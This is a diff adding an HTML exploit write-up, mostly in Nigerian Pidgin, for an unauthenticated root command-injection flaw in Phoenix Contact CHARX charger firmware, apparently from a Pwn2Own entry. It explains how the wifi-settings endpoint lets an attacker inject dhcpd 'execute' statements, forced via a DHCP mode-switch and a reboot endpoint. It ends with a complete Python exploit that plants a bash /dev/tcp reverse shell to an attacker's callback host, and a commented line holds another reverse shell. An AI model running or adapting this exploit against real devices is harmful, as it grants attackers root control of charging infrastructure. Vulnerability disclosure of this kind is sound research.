@@ -1,0 +1,179 @@
+<h1 id="phoenix-contact-rce">Phoenix Contact RCE</h1>
+<link rel="stylesheet" href="style.css">
+<h2 id="brief">Brief</h2>
+<p>Dem put one wahala for di latest version of Phoenix Contact firmware
+wey dem get for CHARX series.</p>
+<p>Dis wahala fit make pesin run command wey no get permission, e fit
+make pesin run code as root.</p>
+<h2 id="details">Details</h2>
+<p>Anybody wey no get permission fit send POST data go dis endpoint,
+come change how wifi dey set for di device.</p>
+<p>If <code>xaccess_point_service</code> run wit di argument
+<code>start</code>, di code go check if di action wey dey config file na
+<code>access_point</code></p>
+<pre><code># Start di access point service
+def start():
+    log(f&quot;starting {SCRIPT_NAME}...&quot;)
+    data = get_access_point_data()
+    log(f&quot;{data}&quot;)
+    timeout = data.get(&#39;available_time&#39;, 0)
+    operation_mode = data.get(&quot;operation_mode&quot;)
+
+    if operation_mode == &quot;access_point&quot;:
+        update_config_files(data)
+        update_default_dhcp(add=True)
+        set_iface_mode_ap()
+        restart_dhcpd()
+        start_hostapd()
+        set_timeout(timeout)</code></pre>
+<p>If e be like that, e go call <code>update_config_files</code></p>
+<pre><code>def update_config_files(config):
+    network_ip, netmask = split_network(config[&quot;network_cidr&quot;])
+    broadcast = get_network_broadcast(config[&quot;network_cidr&quot;])
+
+    set_interfaces(config[&#39;ip_address&#39;], netmask, broadcast)
+
+    set_dhcp_config(network_ip, netmask, config[&quot;ip_from&quot;], config[&quot;ip_to&quot;], config[&quot;ip_address&quot;])
+
+    set_hostapd_config(config[&quot;ssid&quot;], config[&quot;band&quot;], config[&#39;encryption&#39;][-1], config[&quot;password&quot;])
+
+    ip_address_cidr = f&quot;{config[&#39;ip_address&#39;]}/{config[&#39;network_cidr&#39;].split(&#39;/&#39;)[1]}&quot;
+    restart_network(ip_address_cidr)</code></pre>
+<p>Dis one call <code>set_dhcp_config</code>:</p>
+<pre><code># Set di DHCP config for di access point
+def set_dhcp_config(network, netmask, ip_from, ip_to, access_point_ip):
+    log(f&quot;updating {DHCPD_CONF_PATH}&quot;)
+    new_config = DHCPD_CONF.format(**{
+        &quot;network&quot;: network,
+        &quot;netmask&quot;: netmask,
+        &quot;ip_from&quot;: ip_from,
+        &quot;ip_to&quot;: ip_to,
+        &quot;access_point_ip&quot;: access_point_ip,
+    })
+    clear_config(DHCPD_CONF_PATH)
+    clear_config(DHCPD_CONF_PATH_2)
+    append_to_file(DHCPD_CONF_PATH, content=new_config)
+    append_to_file(DHCPD_CONF_PATH_2, content=new_config)</code></pre>
+<p>Dis function dey do two things. First, e go clear di config wey dey
+before for di file (e use comment lines wey be start/stop markers).</p>
+<p>Second, e go write new config inside di file
+<code>/etc/dhcp/dhcpd.conf</code></p>
+<p><code>dhcpd</code> get one <code>execute</code> statement wey fit run
+external commands. Because no validation dey for <code>ip_to</code>
+field, pesin fit put command for dis field come e go run am when
+<code>dhcpd</code> dey read di config file.</p>
+<h2 id="execution">Execution</h2>
+<p>E no easy to trigger dis wahala, so we go use another endpoint wey no
+need auth, <code>api/v1.0/reboot</code> inside
+<code>api_reboot.so</code>, to make device restart. Dis restart go
+trigger parsing and execution of di command.</p>
+<p>Dis script dey only run if device dey client mode, but for dis
+contest, we need to hack server mode device. To solve am, we go use how
+di device dey behave with DHCP bind scripts to make am switch mode.</p>
+<p>If we advertise IP address for 192.168.4.0/24 range, device go
+restart go client mode.</p>
+<p>For <code>/etc/udhcpc.d/60systemreconfigure</code>:</p>
+<pre><code>#!/bin/bash
+# /etc/udhcpc.d/60checkToSwitchToEv2000
+
+HOSTNAME_EV3000=&quot;ev3000&quot;
+SWITCH_SCRIPT=&quot;/usr/lib/charx-system-switch/switch-to-ev2000.sh&quot;
+
+RECONF_IP1_VALUE=192
+RECONF_IP2_VALUE=168
+RECONF_IP3_VALUE=4
+RECONF_IP4_LOWER_LIMIT=2
+RECONF_IP4_UPPER_LIMIT=128
+
+INTERVENTION_WAIT_TIME_SEC=180  # Make e wait small to prevent boot loop
+
+reason=$1
+
+hostname=&quot;$(cat /etc/hostname)&quot; # SystemConfigManager fit no dey run for dis time
+
+if [ &quot;$reason&quot; == &quot;bound&quot; ] &amp;&amp; [ &quot;$hostname&quot; == &quot;$HOSTNAME_EV3000&quot;  ];then
+    # DHCP get new address
+    ip_address=&quot;$(ifconfig eth0 | grep &#39;inet addr:&#39;| grep -v &#39;127.0.0.1&#39; | cut -d: -f2 | awk &#39;{ print $1}&#39;)&quot;
+    IFS=. read ip1 ip2 ip3 ip4 &lt;&lt;&lt; &quot;$ip_address&quot;
+    if [[ $ip1 -ge 0 ]] &amp;&amp; [[ $ip1 -le 255 ]] &amp;&amp; [[ $ip2 -ge 0 ]] &amp;&amp; [[ $ip2 -le 255 ]] &amp;&amp; [[ $ip3 -ge 0 ]] &amp;&amp; [[ $ip3 -le 255 ]] &amp;&amp; [[ $ip4 -ge 0 ]] &amp;&amp; [[ $ip4 -le 255 ]]; then
+        /usr/bin/logger &quot;recievied valid IPv4-Address via dhcp [$ip1.$ip2.$ip3.$ip4]&quot;
+        
+        if [[ $ip1 -eq $RECONF_IP1_VALUE ]] &amp;&amp; [[ $ip2 -eq $RECONF_IP2_VALUE ]] &amp;&amp; [[ $ip3 -eq $RECONF_IP3_VALUE ]] &amp;&amp; [[ $ip4 -ge $RECONF_IP4_LOWER_LIMIT ]] &amp;&amp; [[ $ip4 -le $RECONF_IP4_UPPER_LIMIT ]]; then
+            /usr/bin/logger &quot;System dey ev3000 mode [hostname: $hostname] and get ip-address for eth1 dhcp subnet [$ip1.$ip2.$ip3.$ip4]&quot;
+            /usr/bin/logger &quot;System go try switch to ev2000&quot;
+            
+            /bin/sleep $INTERVENTION_WAIT_TIME_SEC &amp;&amp; $SWITCH_SCRIPT &amp;
+        fi
+    fi
+    
+fi</code></pre>
+<p>Finally, to hack server mode device, we:</p>
+<ol type="1">
+<li>Advertise 192.168.4.0/24 IP as DHCP server, make am reboot</li>
+<li>POST to endpoint to put command</li>
+<li>POST to restart endpoint to make reboot happen.</li>
+</ol>
+<p>For test, e dey take about 9 minutes, but e fit happen faster if
+device check for new lease quick. We think say on first boot, we fit
+advertise to cause client mode switch early.</p>
+<h2 id="repair">Repair</h2>
+<p>For Pwn2Own contest, we fit use dis method to make reverse shell.
+Device no get binary signing or auth, real attack fit replace or create
+file before running
+<code>/usr/lib/charx-system-switch/switch-to-ev3000.sh</code> to come
+back server mode.</p>
+<h2 id="exploit">Exploit</h2>
+<pre><code>import argparse
+import json
+import requests
+from urllib.parse import urljoin
+
+
+class CharxTarget:
+    __slots__ = [&quot;__target_url&quot;, &quot;__is_client&quot;, &quot;__target_endpoint&quot;]
+
+    def __init__(self, url: str):
+        self.__target_url: str = url
+        self.__target_endpoint: str = urljoin(url, &quot;api/v1.0/Wifi/settings&quot;)
+
+    def exploit(self, callback_ip: str, callback_port: int):
+        # command: str = &quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.2.36/1337 0&gt;&amp;1&quot;
+        # command: str = &quot;,&quot;.join([f&#39;&quot;{part}&quot;&#39; for part in shlex.split(command)])
+        # print(f&quot;split command: {command}&quot;)
+
+        data = {
+            &quot;operation_mode&quot;: &quot;access_point&quot;,
+            &quot;available_time&quot;: 1200,
+            &quot;band&quot;: &quot;g&quot;,
+            &quot;encryption&quot;: &quot;WPA2&quot;,
+            &quot;ip_address&quot;: &quot;192.168.1.1&quot;,
+            &quot;ip_from&quot;: &quot;192.168.1.100&quot;,
+            &quot;ip_to&quot;: &#39;192.168.1.254;}\nexecute(&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/&#39; + callback_ip + &#39;/&#39; + str(callback_port) + &#39; 0&gt;&amp;1&quot;);\nsubnet 192.168.13.0 netmask 255.255.255.0 {set pew = 1&#39;,
+            &quot;ssid&quot;: &quot;CHARX_AP&quot;,
+            &quot;network_cidr&quot;: &quot;192.168.1.0/24&quot;,
+            &quot;password&quot;: &quot;CHARX_Passwordl&quot;,
+            &quot;connect_network&quot;: &quot;&quot;,
+            &quot;country_code&quot;: &quot;DE&quot;,
+            &quot;enable_access_point&quot;: True,
+            &quot;enable_wifi&quot;: False,
+        }
+
+        r = requests.post(self.__target_endpoint, data={&quot;value&quot;: json.dumps(data)})
+        print(f&quot;Response to injection: {r.status_code}&quot;)
+
+        r = requests.post(urljoin(self.__target_url, &quot;api/v1.0/reboot&quot;))
+        print(f&quot;Response to reboot: {r.status_code}&quot;)
+
+        r = requests.get(self.__target_endpoint)
+        print(r.text)
+
+
+if __name__ == &quot;__main__&quot;:
+    args = argparse.ArgumentParser(description=&quot;charx RCE&quot;)
+    args.add_argument(&quot;--url&quot;, type=str, required=True, help=&quot;Web UI base URL (e.g http://192.168.2.38:5001/&quot;)
+    args.add_argument(&quot;--ip&quot;, type=str, required=True, help=&quot;The IP to connect to&quot;)
+    args.add_argument(&quot;--port&quot;, type=str, required=True, help=&quot;The port to connect to&quot;)
+
+    args = args.parse_args()
+    CharxTarget(args.url).exploit(args.ip, args.port)
+</code></pre>
